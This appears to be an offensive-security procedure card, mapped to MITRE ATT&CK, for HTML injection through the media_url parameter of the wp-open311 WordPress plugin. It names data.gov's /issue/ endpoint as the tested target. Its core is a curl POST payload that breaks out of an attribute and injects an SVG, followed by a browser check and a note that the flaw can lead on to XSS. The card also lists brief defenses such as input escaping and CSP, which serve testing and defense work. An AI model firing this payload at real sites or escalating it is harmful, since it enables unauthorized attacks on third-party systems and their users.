---
id: proc-uuid-2
tags:
  - html-injection
type: procedure
tools:
  - '[[tools/Mozilla-Firefox]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-html-inject]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:52:38.847Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-HTML-via-media_url-on-issue-Endpoint

## Summary

This procedure demonstrates HTML injection by manipulating the media_url parameter in the wp-open311 WordPress plugin on the /issue/ endpoint, allowing arbitrary HTML tags to be rendered.

## Description

The vulnerability arises from lack of sanitization in the plugin, enabling attackers to close existing HTML attributes and inject elements like SVG. This can be observed visually and serves as a precursor to XSS escalation. Tested on https://www.data.gov/issue/.

## Requirements

1. Public access to the endpoint.
2. Tool like curl for POST requests.
3. Browser to verify rendering.

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in plugins.
- Use Content Security Policy (CSP) to block inline HTML.

## Objectives

1. Confirm arbitrary HTML insertion.
2. Visualize injection success.
3. Identify context for further exploitation.

## Instructions

### Step 1: Submit Injection Payload

**Context**: Close the attribute quote and inject an SVG to test rendering.

**Command** ([[commands/curl-html-inject]]):
```bash
curl -X POST 'https://www.data.gov/issue/' -d 'media_url=catalog.data.gov/dataset/consumer-complaint-database"%3E%3Csvg height="100" width="100"> <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /> </svg>'
```

> Response shows the SVG as a red circle if injected successfully.

### Step 2: Verify in Browser

**Context**: Load the reflected page in Firefox to confirm visual output. Use dev tools to inspect HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/curl-html-inject]]

## Tools Used

- [[tools/Mozilla-Firefox]]

## Tags

- [[html-injection]]
